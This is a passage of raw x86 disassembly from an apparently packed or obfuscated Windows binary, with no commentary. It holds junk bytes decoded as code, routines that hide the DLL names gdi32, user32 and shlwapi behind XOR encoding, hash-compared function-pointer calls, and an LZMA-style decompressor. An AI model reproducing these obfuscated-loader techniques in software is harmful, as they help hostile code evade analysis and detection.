  425778:	cmp    DWORD PTR [ecx],eax
  42577a:	sbb    al,0x2a
  42577c:	mov    esi,0x745217e7
  425781:	adc    bh,dl
  425783:	scas   eax,DWORD PTR es:[edi]
  425784:	or     edx,ebp
  425786:	jns    0x425759
  425788:	stos   BYTE PTR es:[edi],al
  425789:	xchg   ebx,eax
  42578a:	scas   al,BYTE PTR es:[edi]
  42578b:	(bad)  
  42578c:	outs   dx,BYTE PTR ds:[esi]
  42578d:	push   eax
  42578e:	call   0x71199dba
  425793:	xchg   DWORD PTR [ecx-0x3c],esi
  425796:	in     eax,dx
  425797:	xchg   DWORD PTR [esi],esp
  425799:	push   esp
  42579a:	arpl   dx,bp
  42579c:	mov    ecx,0x839d371b
  4257a1:	mov    bh,0x28
  4257a3:	loop   0x42577e
  4257a5:	jb     0x42572a
  4257a7:	(bad)  
  4257a8:	cld    
  4257a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257aa:	cs push cs
  4257ac:	dec    esi
  4257ad:	or     eax,0xa644c259
  4257b2:	test   DWORD PTR [edi],ecx
  4257b4:	pop    esp
  4257b5:	js     0x425815
  4257b7:	mov    ebp,0xbb5674ef
  4257bc:	push   edi
  4257bd:	jmp    0x2f9b:0xf9a43f09
  4257c4:	sbb    ch,ah
  4257c6:	das    
  4257c7:	ins    BYTE PTR es:[edi],dx
  4257c8:	add    esp,esi
  4257ca:	push   edi
  4257cb:	sbb    cl,BYTE PTR [edi+0x3]
  4257ce:	ins    BYTE PTR es:[edi],dx
  4257cf:	lahf   
  4257d0:	inc    ebp
  4257d1:	int3   
  4257d2:	adc    esp,ecx
  4257d4:	shl    BYTE PTR [ecx+esi*2-0x7bf007c5],cl
  4257db:	dec    edi
  4257dc:	add    BYTE PTR [eax],al
  4257de:	add    BYTE PTR [ecx+0x458bf475],cl
  4257e4:	hlt    
  4257e5:	mov    esi,DWORD PTR [ebp+0xc]
  4257e8:	xor    eax,ecx
  4257ea:	lea    eax,[eax*8+0x1939820]
  4257f1:	mov    eax,DWORD PTR [esi+eax*1]
  4257f4:	mov    DWORD PTR [ebp+0xc],eax
  4257f7:	mov    eax,DWORD PTR [ebp-0x4]
  4257fa:	mov    esi,DWORD PTR [ebp-0x8]
  4257fd:	xor    eax,ecx
  4257ff:	xor    esi,ecx
  425801:	add    esi,edx
  425803:	add    eax,edx
  425805:	imul   eax,esi
  425808:	mov    esi,DWORD PTR [ebp+0xc]
  42580b:	cmp    esi,eax
  42580d:	je     0x42582e
  425813:	mov    eax,DWORD PTR [ebp-0x4]
  425816:	xor    eax,ecx
  425818:	mov    ecx,DWORD PTR [ebp+0xc]
  42581b:	add    eax,edx
  42581d:	imul   eax,ecx
  425820:	add    eax,DWORD PTR [ebp+0x8]
  425823:	mov    DWORD PTR [ebp+0xc],eax
  425826:	mov    eax,DWORD PTR [ebp+0xc]
  425829:	jmp    0x42583f
  42582e:	mov    eax,DWORD PTR [ebp-0x4]
  425831:	mov    esi,DWORD PTR [ebp-0x8]
  425834:	xor    esi,ecx
  425836:	xor    eax,ecx
  425838:	add    esi,edx
  42583a:	add    eax,edx
  42583c:	imul   eax,esi
  42583f:	pop    edi
  425840:	pop    esi
  425841:	leave  
  425842:	ret    0x8
	...
  425851:	add    BYTE PTR [eax],al
  425853:	add    ah,cl
  425855:	cmp    al,0xf3
  425857:	dec    ebp
  425858:	add    BYTE PTR [eax],al
  42585a:	add    BYTE PTR [eax],al
  42585c:	add    al,BYTE PTR [eax]
  42585e:	add    BYTE PTR [eax],al
  425860:	add    BYTE PTR ss:[eax],al
  425863:	add    BYTE PTR [eax+0x58],dh
  425866:	add    al,BYTE PTR [eax]
  425868:	jo     0x4258b6
  42586a:	add    al,BYTE PTR [eax]
  42586c:	add    BYTE PTR [eax],al
  42586e:	add    BYTE PTR [eax],al
  425870:	push   edx
  425871:	push   ebx
  425872:	inc    esp
  425873:	push   ebx
  425874:	mov    bl,0xf7
  425876:	pop    esp
  425877:	dec    ebp
  425878:	xchg   edi,eax
  425879:	ss inc edx
  42587b:	inc    ebp
  42587c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42587d:	lock or BYTE PTR [ebp+0x315e4ae3],cl
  425884:	add    DWORD PTR [eax],eax
  425886:	add    BYTE PTR [eax],al
  425888:	inc    edi
  425889:	cmp    bl,BYTE PTR [ebx+edx*2+0x79]
  42588d:	jae    0x4258af
  42588f:	inc    esp
  425890:	imul   esi,DWORD PTR [edx+0x20],0x5c6e6957
  425897:	inc    esi
  425898:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  4258a0:	outs   dx,BYTE PTR ds:[esi]
  4258a1:	jae    0x42590c
  4258a3:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  4258ab:	or     BYTE PTR [ecx],al
  4258ad:	add    BYTE PTR [eax],al
  4258af:	push   ebx
  4258b0:	mov    eax,ebx
  4258b2:	xchg   ecx,eax
  4258b3:	mov    eax,DWORD PTR [ebp+0x8]
  4258b6:	cmp    eax,0xf89c85a5
  4258bb:	jne    0x425d7c
  4258c1:	mov    eax,DWORD PTR [ebp+0xc]
  4258c4:	cmp    eax,0xf89c85a2
  4258c9:	jne    0x425d7c
  4258cf:	mov    eax,DWORD PTR [ebp+0x24]
  4258d2:	mov    DWORD PTR [ebp-0x4],eax
  4258d5:	mov    eax,DWORD PTR [ebp-0x4]
  4258d8:	mov    eax,DWORD PTR [eax+0x1d8]
  4258de:	mov    eax,DWORD PTR [eax]
  4258e0:	mov    eax,DWORD PTR [eax]
  4258e2:	mov    DWORD PTR [ebp-0x8],eax
  4258e5:	mov    BYTE PTR [ebp-0x18],0x1a
  4258e9:	mov    BYTE PTR [ebp-0x17],0x1f
  4258ed:	mov    BYTE PTR [ebp-0x16],0x18
  4258f1:	mov    BYTE PTR [ebp-0x15],0x4e
  4258f5:	mov    BYTE PTR [ebp-0x14],0x51
  4258f9:	mov    BYTE PTR [ebp-0x13],0x83
  4258fd:	mov    BYTE PTR [ebp-0x20],0xc
  425901:	mov    BYTE PTR [ebp-0x1f],0xe
  425905:	mov    BYTE PTR [ebp-0x1e],0x1c
  425909:	mov    BYTE PTR [ebp-0x1d],0x11
  42590d:	mov    BYTE PTR [ebp-0x1c],0x4e
  425911:	mov    BYTE PTR [ebp-0x1b],0x51
  425915:	mov    BYTE PTR [ebp-0x1a],0x83
  425919:	mov    BYTE PTR [ebp-0x28],0xe
  42591d:	mov    BYTE PTR [ebp-0x27],0x1b
  425921:	mov    BYTE PTR [ebp-0x26],0x17
  425925:	mov    BYTE PTR [ebp-0x25],0xa
  425929:	mov    BYTE PTR [ebp-0x24],0x20
  42592d:	mov    BYTE PTR [ebp-0x23],0x13
  425931:	mov    BYTE PTR [ebp-0x22],0x18
  425935:	mov    BYTE PTR [ebp-0x21],0x83
  425939:	xor    ecx,ecx
  42593b:	lea    eax,[ebp+ecx*1-0x18]
  42593f:	movzx  edx,BYTE PTR [eax]
  425942:	xor    edx,0x7e
  425945:	add    edx,0x3
  425948:	inc    ecx
  425949:	mov    BYTE PTR [eax],dl
  42594b:	cmp    ecx,0x6
  42594e:	jb     0x42593b
  425950:	xor    ecx,ecx
  425952:	lea    eax,[ebp+ecx*1-0x20]
  425956:	movzx  edx,BYTE PTR [eax]
  425959:	xor    edx,0x7e
  42595c:	add    edx,0x3
  42595f:	inc    ecx
  425960:	mov    BYTE PTR [eax],dl
  425962:	cmp    ecx,0x7
  425965:	jb     0x425952
  425967:	xor    ecx,ecx
  425969:	lea    eax,[ebp+ecx*1-0x28]
  42596d:	movzx  edx,BYTE PTR [eax]
  425970:	xor    edx,0x7e
  425973:	add    edx,0x3
  425976:	inc    ecx
  425977:	mov    BYTE PTR [eax],dl
  425979:	cmp    ecx,0x8
  42597c:	jb     0x425969
  42597e:	lea    eax,[ebp-0x2c]
  425981:	mov    DWORD PTR [ebp-0x8],eax
  425984:	mov    ecx,DWORD PTR [ebp-0x8]
  425987:	mov    eax,0x7113fccf
  42598c:	mov    DWORD PTR [ecx],eax
  42598e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425991:	push   esi
  425992:	push   edi
  425993:	mov    esi,0x4e3e
  425998:	mov    ebx,0x3272f5
  42599d:	cmp    ecx,eax
  42599f:	jne    0x425a6a
  4259a5:	lea    eax,[esi+0x39]
  4259a8:	mov    WORD PTR [ebp-0x78],ax
  4259ac:	mov    eax,esi
  4259ae:	mov    WORD PTR [ebp-0x76],ax
  4259b2:	add    eax,0x3f
  4259b5:	mov    WORD PTR [ebp-0x74],ax
  4259b9:	lea    eax,[esi-0x2]
  4259bc:	mov    WORD PTR [ebp-0x72],ax
  4259c0:	add    eax,0x43
  4259c3:	mov    ecx,eax
  4259c5:	lea    eax,[esi-0x9]
  4259c8:	mov    WORD PTR [ebp-0x66],ax
  4259cc:	mov    eax,esi
  4259ce:	mov    WORD PTR [ebp-0x64],ax
  4259d2:	add    eax,0xffffffec
  4259d5:	mov    WORD PTR [ebp-0x62],ax
  4259d9:	mov    eax,0x443
  4259de:	mov    WORD PTR [ebp-0x60],ax
  4259e2:	mov    eax,0x5670
  4259e7:	mov    WORD PTR [ebp-0x5e],ax
  4259eb:	mov    eax,0x6110
  4259f0:	mov    WORD PTR [ebp-0x5c],ax
  4259f4:	lea    eax,[ebp-0xe0]
  4259fa:	push   eax
  4259fb:	mov    eax,DWORD PTR [ebp+0xc]
  4259fe:	mov    edi,0x75108ae
  425a03:	xor    eax,edi
  425a05:	add    eax,ebx
  425a07:	push   eax
  425a08:	mov    WORD PTR [ebp-0x70],cx
  425a0c:	lea    ecx,[esi-0xe]
  425a0f:	mov    edx,ecx
  425a11:	lea    eax,[ebp-0x78]
  425a14:	push   eax
  425a15:	mov    eax,DWORD PTR [ebp-0x4]
  425a18:	mov    eax,DWORD PTR [eax+0x198]
  425a1e:	mov    WORD PTR [ebp-0x6e],dx
  425a22:	mov    edx,0x4f8a
  425a27:	mov    WORD PTR [ebp-0x6c],dx
  425a2b:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425a32:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425a39:	mov    DWORD PTR [ebp-0xe0],0x1
  425a43:	mov    DWORD PTR [ebp-0xdc],0x255
  425a4d:	push   DWORD PTR [eax]
  425a4f:	mov    eax,DWORD PTR [ebp+0x10]
  425a52:	call   eax
  425a54:	mov    DWORD PTR [ebp-0x8],eax
  425a57:	mov    eax,DWORD PTR [ebp-0x8]
  425a5a:	test   eax,eax
  425a5c:	je     0x425a6f
  425a5e:	xor    DWORD PTR ds:0x76586876,0x87687666
  425a68:	jmp    0x425a6f
  425a6a:	mov    edi,0x75108ae
  425a6f:	mov    eax,DWORD PTR [ebp-0x4]
  425a72:	mov    ecx,DWORD PTR [eax+0x18c]
  425a78:	xor    eax,eax
  425a7a:	cmp    DWORD PTR [ecx],eax
  425a7c:	jne    0x425cef
  425a82:	mov    ecx,DWORD PTR [ebp-0x4]
  425a85:	mov    ecx,DWORD PTR [ecx+0x17c]
  425a8b:	mov    DWORD PTR [ecx],eax
  425a8d:	mov    ecx,DWORD PTR [ebp-0x4]
  425a90:	mov    ecx,DWORD PTR [ecx+0x180]
  425a96:	mov    DWORD PTR [ecx],eax
  425a98:	mov    eax,0x4e6d
  425a9d:	mov    WORD PTR [ebp-0x9c],ax
  425aa4:	mov    eax,esi
  425aa6:	mov    WORD PTR [ebp-0x9a],ax
  425aad:	mov    eax,0x4e7d
  425ab2:	mov    WORD PTR [ebp-0x98],ax
  425ab9:	add    eax,0xffffffc0
  425abc:	mov    WORD PTR [ebp-0x96],ax
  425ac3:	mov    eax,0x4f8e
  425ac8:	mov    WORD PTR [ebp-0x94],ax
  425acf:	mov    eax,0x4e32
  425ad4:	mov    WORD PTR [ebp-0x92],ax
  425adb:	add    eax,0x4d
  425ade:	mov    WORD PTR [ebp-0x90],ax
  425ae5:	mov    eax,0x4e30
  425aea:	mov    WORD PTR [ebp-0x8e],ax
  425af1:	mov    eax,esi
  425af3:	mov    WORD PTR [ebp-0x8c],ax
  425afa:	mov    eax,0x4e31
  425aff:	mov    WORD PTR [ebp-0x8a],ax
  425b06:	mov    eax,0x99fd
  425b0b:	mov    WORD PTR [ebp-0x88],ax
  425b12:	mov    eax,0x8d62
  425b17:	mov    WORD PTR [ebp-0x86],ax
  425b1e:	mov    eax,0xd66f
  425b23:	mov    WORD PTR [ebp-0x84],ax
  425b2a:	mov    eax,0xd783
  425b2f:	mov    WORD PTR [ebp-0x82],ax
  425b36:	mov    eax,0x2780
  425b3b:	mov    WORD PTR [ebp-0x80],ax
  425b3f:	mov    eax,0x4780
  425b44:	mov    WORD PTR [ebp-0x7e],ax
  425b48:	mov    eax,0x4e33
  425b4d:	push   0x8
  425b4f:	mov    WORD PTR [ebp-0x7c],ax
  425b53:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425b5a:	mov    DWORD PTR [ebp-0xc],0x83181320
  425b61:	lea    eax,[ebp-0x10]
  425b64:	pop    ecx
  425b65:	mov    dl,BYTE PTR [eax]
  425b67:	xor    dl,0x7e
  425b6a:	add    dl,0x3
  425b6d:	mov    BYTE PTR [eax],dl
  425b6f:	inc    eax
  425b70:	dec    ecx
  425b71:	jne    0x425b65
  425b73:	lea    eax,[ebp-0x10]
  425b76:	mov    DWORD PTR [ebp-0xdc],eax
  425b7c:	lea    eax,[ebp-0xe0]
  425b82:	push   eax
  425b83:	mov    eax,DWORD PTR [ebp+0xc]
  425b86:	xor    eax,edi
  425b88:	add    eax,ebx
  425b8a:	push   eax
  425b8b:	mov    eax,DWORD PTR [ebp-0x4]
  425b8e:	add    eax,0x66
  425b91:	push   eax
  425b92:	mov    eax,DWORD PTR [ebp-0x4]
  425b95:	mov    eax,DWORD PTR [eax+0x198]
  425b9b:	mov    DWORD PTR [ebp-0xe0],0x1
  425ba5:	push   DWORD PTR [eax]
  425ba7:	mov    eax,DWORD PTR [ebp+0x10]
  425baa:	call   eax
  425bac:	mov    ecx,DWORD PTR [ebp+0x8]
  425baf:	xor    ecx,edi
  425bb1:	add    ecx,ebx
  425bb3:	mov    DWORD PTR [ebp-0x8],eax
  425bb6:	cmp    eax,ecx
  425bb8:	jne    0x425bd3
  425bba:	mov    eax,ds:0x33730bcc
  425bbf:	or     eax,0x22150bcf
  425bc4:	mov    ds:0x33730bcc,eax
  425bc9:	add    eax,0x3372e92f
  425bce:	mov    ds:0x33730bcc,eax
  425bd3:	mov    ecx,0x4e66
  425bd8:	mov    eax,ecx
  425bda:	mov    WORD PTR [ebp-0x40],ax
  425bde:	add    eax,0x5
  425be1:	mov    edx,eax
  425be3:	mov    WORD PTR [ebp-0x3e],dx
  425be7:	mov    edx,0x4f93
  425bec:	mov    WORD PTR [ebp-0x3c],dx
  425bf0:	add    edx,0xfffffff8
  425bf3:	mov    WORD PTR [ebp-0x3a],dx
  425bf7:	mov    edx,0x4f89
  425bfc:	mov    WORD PTR [ebp-0x38],dx
  425c00:	add    edx,0x3
  425c03:	mov    WORD PTR [ebp-0x36],dx
  425c07:	mov    edx,0x4f87
  425c0c:	mov    WORD PTR [ebp-0x34],dx
  425c10:	mov    WORD PTR [ebp-0x32],cx
  425c14:	mov    ecx,esi
  425c16:	mov    WORD PTR [ebp-0x30],cx
  425c1a:	lea    ecx,[edx-0x1]
  425c1d:	mov    edx,ecx
  425c1f:	mov    WORD PTR [ebp-0x54],dx
  425c23:	mov    edx,eax
  425c25:	mov    WORD PTR [ebp-0x52],dx
  425c29:	mov    edx,0x4e73
  425c2e:	mov    WORD PTR [ebp-0x50],dx
  425c32:	mov    WORD PTR [ebp-0x4e],ax
  425c36:	lea    eax,[edx-0xa]
  425c39:	mov    WORD PTR [ebp-0x4c],ax
  425c3d:	add    eax,0x3
  425c40:	mov    WORD PTR [ebp-0x4a],ax
  425c44:	lea    eax,[edx-0xc]
  425c47:	mov    WORD PTR [ebp-0x48],ax
  425c4b:	mov    WORD PTR [ebp-0x46],cx
  425c4f:	mov    WORD PTR [ebp-0x44],si
  425c53:	mov    eax,DWORD PTR [ebp+0x8]
  425c56:	movzx  ecx,WORD PTR [ebp-0x54]
  425c5a:	xor    eax,edi
  425c5c:	add    eax,ebx
  425c5e:	xor    eax,ecx
  425c60:	mov    WORD PTR [ebp-0x54],ax
  425c64:	mov    eax,DWORD PTR [ebp+0x8]
  425c67:	movzx  ecx,WORD PTR [ebp-0x40]
  425c6b:	xor    eax,edi
  425c6d:	add    eax,ebx
  425c6f:	xor    eax,ecx
  425c71:	mov    WORD PTR [ebp-0x40],ax
  425c75:	xor    eax,eax
  425c77:	mov    WORD PTR [ebp-0xf4],ax
  425c7e:	mov    WORD PTR [ebp-0x108],ax
  425c85:	mov    edi,DWORD PTR [ebp+0x24]
  425c88:	lea    eax,[ebp-0xf4]
  425c8e:	lea    edx,[ebp-0x54]
  425c91:	mov    DWORD PTR [ebp-0xe0],0x2
  425c9b:	mov    DWORD PTR [ebp-0xdc],eax
  425ca1:	call   0x4286d9
  425ca6:	mov    DWORD PTR [ebp-0xd8],eax
  425cac:	lea    eax,[ebp-0xe0]
  425cb2:	push   eax
  425cb3:	mov    eax,DWORD PTR [ebp+0xc]
  425cb6:	xor    eax,0x75108ae
  425cbb:	add    eax,ebx
  425cbd:	push   eax
  425cbe:	lea    eax,[ebp-0x9c]
  425cc4:	push   eax
  425cc5:	push   DWORD PTR [ebp-0x8]
  425cc8:	mov    eax,DWORD PTR [ebp+0x10]
  425ccb:	call   eax
  425ccd:	mov    edi,DWORD PTR [ebp+0x24]
  425cd0:	lea    eax,[ebp-0x108]
  425cd6:	lea    edx,[ebp-0x40]
  425cd9:	mov    DWORD PTR [ebp-0xdc],eax
  425cdf:	call   0x4286d9
  425ce4:	mov    DWORD PTR [ebp-0xd8],eax
  425cea:	mov    edi,0x75108ae
  425cef:	mov    eax,DWORD PTR [ebp+0x14]
  425cf2:	push   DWORD PTR [ebp-0x4]
  425cf5:	push   DWORD PTR [ebp+0x20]
  425cf8:	push   DWORD PTR [ebp+0x1c]
  425cfb:	push   DWORD PTR [ebp+0x18]
  425cfe:	push   DWORD PTR [ebp+0x10]
  425d01:	push   DWORD PTR [ebp+0x8]
  425d04:	push   DWORD PTR [ebp+0xc]
  425d07:	call   0x426f7a
  425d0c:	test   eax,eax
  425d0e:	je     0x425d52
  425d10:	add    DWORD PTR [ebp-0x4],eax
  425d13:	push   DWORD PTR [ebp-0x4]
  425d16:	lea    esi,[ebp+0x4]
  425d19:	call   0x42616a
  425d1e:	mov    eax,DWORD PTR [ebp-0x4]
  425d21:	mov    eax,DWORD PTR [eax+0x1c8]
  425d27:	mov    eax,DWORD PTR [eax]
  425d29:	xor    eax,edi
  425d2b:	add    eax,ebx
  425d2d:	mov    eax,DWORD PTR [ebp-0x4]
  425d30:	jne    0x425d48
  425d32:	mov    ecx,DWORD PTR [ebp-0x4]
  425d35:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425d3b:	push   DWORD PTR [ecx]
  425d3d:	mov    eax,DWORD PTR [eax+0x1e0]
  425d43:	call   DWORD PTR [eax+0x28]
  425d46:	jmp    0x425d52
  425d48:	mov    eax,DWORD PTR [eax+0x17c]
  425d4e:	mov    eax,DWORD PTR [eax]
  425d50:	add    DWORD PTR [esi],eax
  425d52:	mov    eax,DWORD PTR [ebp-0x4]
  425d55:	mov    eax,DWORD PTR [eax+0x1dc]
  425d5b:	dec    DWORD PTR [eax]
  425d5d:	mov    ecx,DWORD PTR [ebp-0x4]
  425d60:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425d66:	mov    eax,DWORD PTR [eax]
  425d68:	lea    eax,[ecx+eax*4]
  425d6b:	mov    ecx,DWORD PTR [ebp-0x4]
  425d6e:	mov    ecx,DWORD PTR [ecx+0x17c]
  425d74:	mov    eax,DWORD PTR [eax]
  425d76:	mov    ecx,DWORD PTR [ecx]
  425d78:	add    DWORD PTR [eax],ecx
  425d7a:	pop    edi
  425d7b:	pop    esi
  425d7c:	pop    ebx
  425d7d:	leave  
  425d7e:	ret    0x20
  425d81:	push   edi
  425d82:	push   esi
  425d83:	push   ebx
  425d84:	push   ebp
  425d85:	mov    ebp,esp
  425d87:	mov    eax,DWORD PTR [ebp+0x24]
  425d8a:	add    DWORD PTR [ebp+0x28],eax
  425d8d:	push   eax
  425d8e:	cld    
  425d8f:	mov    esi,DWORD PTR [ebp+0x18]
  425d92:	add    DWORD PTR [ebp+0x1c],esi
  425d95:	push   esi
  425d96:	mov    esi,DWORD PTR [ebp+0x14]
  425d99:	lods   eax,DWORD PTR ds:[esi]
  425d9a:	xchg   edx,eax
  425d9b:	push   edx
  425d9c:	mov    cl,BYTE PTR [esi-0x2]
  425d9f:	or     eax,0xffffffff
  425da2:	shl    eax,cl
  425da4:	not    eax
  425da6:	push   eax
  425da7:	mov    cl,dh
  425da9:	or     eax,0xffffffff
  425dac:	shl    eax,cl
  425dae:	not    eax
  425db0:	push   eax
  425db1:	add    cl,dl
  425db3:	mov    edi,esi
  425db5:	sub    esp,0xc
  425db8:	sub    eax,eax
  425dba:	inc    eax
  425dbb:	push   eax
  425dbc:	push   eax
  425dbd:	push   eax
  425dbe:	push   eax
  425dbf:	push   eax
  425dc0:	push   edi
  425dc1:	sub    esi,esi
  425dc3:	push   esi
  425dc4:	or     ebx,0xffffffff
  425dc7:	mov    eax,0x300
  425dcc:	shl    eax,cl
  425dce:	lea    ecx,[eax+0x736]
  425dd4:	mov    eax,0x4000400
  425dd9:	shr    ecx,1
  425ddb:	rep stos DWORD PTR es:[edi],eax
  425ddd:	push   0x5
  425ddf:	pop    ecx
  425de0:	call   0x4260cb
  425de5:	loop   0x425de0
  425de7:	lea    esi,[esi]
  425de9:	lea    edi,[edi]
  425deb:	mov    edi,DWORD PTR [ebp-0x4]
  425dee:	mov    eax,DWORD PTR [ebp-0x10]
  425df1:	sub    edi,DWORD PTR [ebp+0x24]
  425df4:	and    eax,edi
  425df6:	mov    DWORD PTR [ebp-0x18],eax
  425df9:	mov    al,0x0
  425dfb:	call   0x4260e3
  425e00:	jne    0x425e9b
  425e06:	mov    cl,BYTE PTR [ebp-0xc]
  425e09:	and    edi,DWORD PTR [ebp-0x14]
  425e0c:	shl    edi,cl
  425e0e:	sub    cl,0x8
  425e11:	neg    cl
  425e13:	shr    esi,cl
  425e15:	pop    eax
  425e16:	add    edi,esi
  425e18:	pop    esi
  425e19:	lea    edi,[edi+edi*2]
  425e1c:	shl    edi,0x8
  425e1f:	cmp    al,0x7
  425e21:	pop    edx
  425e22:	lea    ecx,[esi+edi*2+0xe6c]
  425e29:	push   ecx
  425e2a:	push   esi
  425e2b:	mov    esi,0x100
  425e30:	push   eax
  425e31:	mov    al,0x1
  425e33:	jb     0x425e69
  425e35:	mov    edi,DWORD PTR [ebp-0x4]
  425e38:	sub    edi,DWORD PTR [ebp-0x24]
  425e3b:	movzx  edi,BYTE PTR [edi]
  425e3e:	mov    ebp,DWORD PTR [ebp-0x34]
  425e41:	shl    edi,1
  425e43:	mov    ecx,esi
  425e45:	and    esi,edi
  425e47:	add    ecx,esi
  425e49:	lea    ebp,[ebp+ecx*2+0x0]
  425e4d:	call   0x426102
  425e52:	mov    ecx,eax
  425e54:	shr    esi,0x8
  425e57:	and    ecx,0x1
  425e5a:	cmp    esi,ecx
  425e5c:	mov    esi,0x100
  425e61:	jne    0x425e71
  425e63:	cmp    eax,esi
  425e65:	jb     0x425e3e
  425e67:	jmp    0x425e7d
  425e69:	mov    ebp,DWORD PTR [ebp-0x34]
  425e6c:	call   0x426102
  425e71:	inc    eax
  425e72:	inc    esi
  425e73:	sub    eax,0x1
  425e76:	sub    esi,0x1
  425e79:	cmp    eax,esi
  425e7b:	jb     0x425e69
  425e7d:	pop    edx
  425e7e:	inc    edx
  425e7f:	cmp    edx,0x5
  425e82:	dec    edx
  425e83:	mov    ecx,edx
  425e85:	jb     0x425e96
  425e87:	inc    edx
  425e88:	cmp    edx,0xb
  425e8b:	dec    edx
  425e8c:	mov    cl,0x4
  425e8e:	dec    cl
  425e90:	jb     0x425e96
  425e92:	mov    cl,0x7
  425e94:	dec    cl
  425e96:	sub    edx,ecx
  425e98:	push   edx
  425e99:	jmp    0x425eea
  425e9b:	mov    al,0xc1
  425e9d:	dec    al
  425e9f:	call   0x4260f3
  425ea4:	jne    0x425eba
  425ea6:	pop    eax
  425ea7:	pop    edi
  425ea8:	pop    edx
  425ea9:	pop    ecx
  425eaa:	pop    edx
  425eab:	pop    ecx
  425eac:	push   DWORD PTR [esp]
  425eaf:	push   ecx
  425eb0:	push   edx
  425eb1:	mov    edx,0x664
  425eb6:	mov    cl,0x0
  425eb8:	jmp    0x425f2d
  425eba:	mov    al,0xcd
  425ebc:	dec    al
  425ebe:	call   0x4260f3
  425ec3:	jne    0x425ef3
  425ec5:	mov    al,0xf1
  425ec7:	dec    al
  425ec9:	call   0x4260e3
  425ece:	jne    0x425f23
  425ed0:	pop    eax
  425ed1:	cmp    al,0x7
  425ed3:	mov    al,0x9
  425ed5:	jb     0x425ed9
  425ed7:	mov    al,0xb
  425ed9:	push   eax
  425eda:	mov    esi,DWORD PTR [ebp-0x4]
  425edd:	sub    esi,DWORD PTR [ebp-0x24]
  425ee0:	cmp    esi,DWORD PTR [ebp+0x24]
  425ee3:	jb     0x4260ba
  425ee9:	lods   al,BYTE PTR ds:[esi]
  425eea:	mov    edi,DWORD PTR [ebp-0x4]
  425eed:	stos   BYTE PTR es:[edi],al
  425eee:	jmp    0x426081
  425ef3:	mov    al,0xd8
  425ef5:	call   0x4260f3
  425efa:	mov    esi,DWORD PTR [ebp-0x28]
  425efd:	je     0x425f1a
  425eff:	mov    al,0xe4
  425f01:	call   0x4260f3
  425f06:	mov    esi,DWORD PTR [ebp-0x2c]
  425f09:	je     0x425f14
  425f0b:	mov    esi,DWORD PTR [ebp-0x30]
  425f0e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425f11:	mov    DWORD PTR [ebp-0x30],ecx
  425f14:	mov    ecx,DWORD PTR [ebp-0x28]
  425f17:	mov    DWORD PTR [ebp-0x2c],ecx
  425f1a:	mov    ecx,DWORD PTR [ebp-0x24]
  425f1d:	mov    DWORD PTR [ebp-0x28],ecx
  425f20:	mov    DWORD PTR [ebp-0x24],esi
  425f23:	pop    eax
  425f24:	pop    edi
  425f25:	pop    ecx
  425f26:	mov    edx,0xa68
  425f2b:	mov    cl,0x8
  425f2d:	add    edx,edi
  425f2f:	push   edx
  425f30:	push   edi
  425f31:	cmp    al,0x7
  425f33:	mov    al,cl
  425f35:	jb     0x425f39
  425f37:	add    al,0x3
  425f39:	push   eax
  425f3a:	mov    ebp,DWORD PTR [ebp-0x34]
  425f3d:	call   0x426100
  425f42:	jne    0x425f58
  425f44:	mov    eax,DWORD PTR [ebp-0x18]
  425f47:	mov    edi,DWORD PTR [ebp-0x34]
  425f4a:	shl    eax,0x3
  425f4d:	sub    ecx,ecx
  425f4f:	push   0x8
  425f51:	pop    esi
  425f52:	lea    edi,[edi+eax*2+0x4]
  425f56:	jmp    0x425f8d
  425f58:	mov    ebp,DWORD PTR [ebp-0x34]
  425f5b:	add    ebp,0x2
  425f5e:	call   0x426100
  425f63:	jne    0x425f7d
  425f65:	mov    eax,DWORD PTR [ebp-0x18]
  425f68:	mov    edi,DWORD PTR [ebp-0x34]
  425f6b:	shl    eax,0x3
  425f6e:	push   0x8
  425f70:	pop    ecx
  425f71:	push   0x8
  425f73:	pop    esi
  425f74:	lea    edi,[edi+eax*2+0x104]
  425f7b:	jmp    0x425f8d
  425f7d:	mov    edi,0x204
  425f82:	add    edi,DWORD PTR [ebp-0x34]
  425f85:	push   0x10
  425f87:	pop    ecx
  425f88:	mov    esi,0x100
  425f8d:	mov    DWORD PTR [ebp-0x1c],ecx
  425f90:	sub    eax,eax
  425f92:	inc    eax
  425f93:	mov    ebp,edi
  425f95:	call   0x426102
  425f9a:	mov    ecx,eax
  425f9c:	sub    ecx,esi
  425f9e:	jb     0x425f93
  425fa0:	add    DWORD PTR [ebp-0x1c],ecx
  425fa3:	cmp    DWORD PTR [ebp-0x3c],0x4
  425fa7:	jae    0x42605d
  425fad:	add    DWORD PTR [ebp-0x3c],0x7
  425fb1:	mov    ecx,DWORD PTR [ebp-0x1c]
  425fb4:	cmp    ecx,0x4
  425fb7:	jb     0x425fbc
  425fb9:	push   0x3
  425fbb:	pop    ecx
  425fbc:	mov    edi,DWORD PTR [ebp-0x38]
  425fbf:	shl    ecx,0x6
  425fc2:	sub    eax,eax
  425fc4:	inc    eax
  425fc5:	push   0x40
  425fc7:	pop    esi
  425fc8:	lea    edi,[edi+ecx*2+0x360]
  425fcf:	mov    ebp,edi
  425fd1:	call   0x426102
  425fd6:	mov    ecx,eax
  425fd8:	sub    ecx,esi
  425fda:	jb     0x425fcf
  425fdc:	mov    DWORD PTR [ebp-0x18],ecx
  425fdf:	mov    DWORD PTR [ebp-0x24],ecx
  425fe2:	cmp    ecx,0x4
  425fe5:	jb     0x42605a
  425fe7:	mov    esi,ecx
  425fe9:	and    DWORD PTR [ebp-0x24],0x1
  425fed:	shr    esi,1
  425fef:	or     DWORD PTR [ebp-0x24],0x2
  425ff3:	dec    esi
  425ff4:	cmp    ecx,0xe
  425ff7:	jae    0x426012
  425ff9:	mov    eax,0x2af
  425ffe:	sub    eax,ecx
  426000:	mov    ecx,esi
  426002:	shl    BYTE PTR [ebp-0x24],cl
  426005:	add    eax,DWORD PTR [ebp-0x24]
  426008:	shl    eax,1
  42600a:	add    eax,DWORD PTR [ebp-0x38]
  42600d:	mov    DWORD PTR [ebp-0x34],eax
  426010:	jmp    0x42603f
